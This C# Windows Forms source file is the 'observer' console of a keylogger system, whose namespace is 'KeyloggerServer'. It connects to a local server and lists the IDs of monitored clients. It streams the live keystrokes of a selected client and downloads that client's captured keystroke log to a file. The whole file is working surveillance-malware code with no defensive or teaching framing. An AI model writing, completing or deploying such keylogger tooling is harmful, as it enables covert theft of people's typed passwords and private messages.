using System;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Reflection.Metadata;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Common;

namespace KeyloggerServer
{
    public partial class ClientObserver : Form
    {
        private TcpClient _client;
        private NetworkStream _stream;
        private CancellationTokenSource _cts;
        private string currentlySelectedClientId = null;
        public ClientObserver()
        {
            InitializeComponent();
        }

        private async void buttonStart_Click(object sender, EventArgs e)
        {
            try
            {
                _cts = new CancellationTokenSource();
                _client = new TcpClient("localhost", 5000);
                _stream = _client.GetStream();

                // Send handshake to identify as observer
                byte[] handshake = Encoding.UTF8.GetBytes("observer");
                await _stream.WriteAsync(handshake, 0, handshake.Length);

                AppendLog("Connected as observer. Listening for data...");

                _ = Task.Run(() => ListenLoop(_cts.Token));
                buttonStart.Enabled = false;
                buttonStop.Enabled = true;
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Connection error", ex);
                AppendLog(kex.ToString());
            }
        }

        private async Task ListenLoop(CancellationToken token)
        {
            byte[] buffer = new byte[1024];

            try
            {
                while (!token.IsCancellationRequested)
                {
                    int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length, token);
                    if (bytesRead == 0) break; // disconnected

                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                    if (message.StartsWith("[LIST]"))
                    {
                        string[] ids = message.Substring(6).Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                        UpdateClientList(ids);
                    }
                    else if (message.StartsWith("[FILE]"))
                    {
                        string fileContent = message.Substring(6); // Remove "[FILE]"
                        if (this.InvokeRequired)
                        {
                            this.Invoke(new Action(() =>
                            {
                                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                                {
                                    saveFileDialog.Filter = "Text files (*.txt)|*.txt";
                                    saveFileDialog.FileName = currentlySelectedClientId.Replace(":", "_") + ".txt";

                                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                                    {
                                        File.WriteAllText(saveFileDialog.FileName, fileContent);
                                        AppendLog("File saved successfully.");
                                    }
                                }
                            }));
                        }
                    }
                    else if (message.StartsWith("[ERROR]"))
                    {
                        string errorMessage = message.Substring(7); // Remove "[ERROR]"
                        AppendLog("Server error: " + errorMessage);
                        MessageBox.Show("Server error: " + errorMessage, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    else if (message.StartsWith("["))
                    {
                        int end = message.IndexOf(']');
                        string clientId = message.Substring(1, end - 1);
                        string content = message.Substring(end + 1);

                        if (clientId == currentlySelectedClientId)
                            AppendMessage(content);
                    }
                }
            }
            catch (OperationCanceledException)
            {
                AppendLog("Listening cancelled.");
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Error while receiving data from server.", ex);
                AppendLog(kex.ToString());
            }
        }

        private void AppendLog(string text)
        {
            if (InvokeRequired)
                BeginInvoke(new Action<string>(AppendLog), text);
            else
                textBoxLog.AppendText(text + Environment.NewLine);
        }

        private void AppendMessage(string msg)
        {
            if (InvokeRequired)
                BeginInvoke(new Action<string>(AppendMessage), msg);
            else
                textBoxMessage.AppendText(msg);
        }

        private void buttonStop_Click(object sender, EventArgs e)
        {
            try
            {
                _cts?.Cancel(); // stop the listening loop
                _stream?.Close();
                _client?.Close();

                AppendLog("Observer client stopped.");
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Error while stopping observer client.", ex);
                AppendLog(kex.ToString());
            }
            finally
            {
                buttonStart.Enabled = true;
                buttonStop.Enabled = false;
            }
        }

        private void UpdateClientList(string[] ids)
        {
            if (listViewClients.InvokeRequired)
            {
                listViewClients.Invoke(new Action(() => UpdateClientList(ids)));
                return;
            }

            listViewClients.BeginUpdate();
            listViewClients.Items.Clear();

            foreach (var id in ids)
            {
                if (!string.IsNullOrWhiteSpace(id))
                {
                    listViewClients.Items.Add(new ListViewItem(id));
                }
            }

            listViewClients.EndUpdate();
        }

        private void listViewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count > 0)
            {
                currentlySelectedClientId = listViewClients.SelectedItems[0].Text;
                textBoxMessage.Clear(); // optional: clear old keystrokes
                buttonDownload.Enabled = true;
            }
            else
            {
                currentlySelectedClientId = null;
                buttonDownload.Enabled = false;
            }
        }

        private async void buttonRefreshList_Click(object sender, EventArgs e)
        {
            try
            {
                if (_stream == null || !_client.Connected)
                {
                    MessageBox.Show("Not connected to server.");
                    return;
                }

                // Send "list" command to the server
                byte[] commandBytes = Encoding.UTF8.GetBytes("list\n");
                await _stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                await _stream.FlushAsync();

                // Don't read response here — it will be handled in ListenLoop
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Failed to refresh client list.", ex);
                MessageBox.Show(kex.ToString());
            }
        }
        private async void buttonDownload_Click(object sender, EventArgs e)
        {
            try
            {
                // Send "getfile" command to the server
                string command = "getfile " + currentlySelectedClientId + "\n";
                byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                await _stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                await _stream.FlushAsync();

                // Response will be handled in ListenLoop
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Failed to request file from server.", ex);
                MessageBox.Show(kex.ToString());
            }
        }


        private void buttonExit_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void helpToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Help.ShowHelp(this, "HELP.chm");
        }
    }
}
